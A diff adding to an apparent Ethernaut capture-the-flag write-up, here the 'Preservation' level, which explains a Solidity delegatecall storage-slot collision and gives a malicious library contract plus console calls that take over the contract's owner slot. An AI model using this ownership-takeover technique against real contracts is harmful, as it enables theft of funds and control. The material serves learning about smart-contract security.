@@ -309,8 +309,35 @@ web3.eth.abi.encodeFunctionCall({
 }, ['<insert owner address here>', '<insert spender address here>', '1000000000000000000000000']);
 
 await web3.eth.sendTransaction({
-    to: "insert address of contract instance here",
-    from: "insert address of spender",
-    data: "insert data payload here"
+    to: "<insert address of contract instance here>",
+    from: "<insert address of spender>",
+    data: "<insert data payload here>"
 })
+```
+
+## 16. Preservation
+You need to understand how `delegatecall` works and how it affects storage variables on the calling contract to be able to solve this level. Essentially, when you try to do `delegatecall` and call the function `setTime()`, what's happening is that it is not just applying the logic of `setTime()` to the storage variables of the calling contract, it is also preserving the index of `storedTime` in the calling contract and using that as a reference as to which variable should it update. In short, the `LibraryContract` is trying to modify the variable at index 0 but on the calling contract, index 0 is the address of `timeZone1Library`. So first you need to call `setTime()` to replace `timeZone1Library` with a malicious contract. In this malicious contract, `setTime()` which will modify index 3 which on the calling contract is the owner variable!
+
+1. Deploy the malicious library contract
+2. Convert the address into uint.
+3. Call either `setFirstTime()` or `setSecondTime()` with the uint value of (2).
+4. Now that the address of `timeZone1Library` has been modified to the malicious contract, call `setFirstTime()` with the uint value of your player address.
+```
+pragma solidity ^0.6.0;
+
+contract LibraryContract {
+
+  // stores a timestamp 
+  address doesNotMatterWhatThisIsOne;
+  address doesNotMatterWhatThisIsTwo;
+  address maliciousIndex;
+
+  function setTime(uint _time) public {
+    maliciousIndex = address(_time);
+  }
+}
+
+await contract.setFirstTime("<insert uint value of your malicious library contract>")
+await contract.setFirstTime("<insert uint value of your player>)
+
 ```
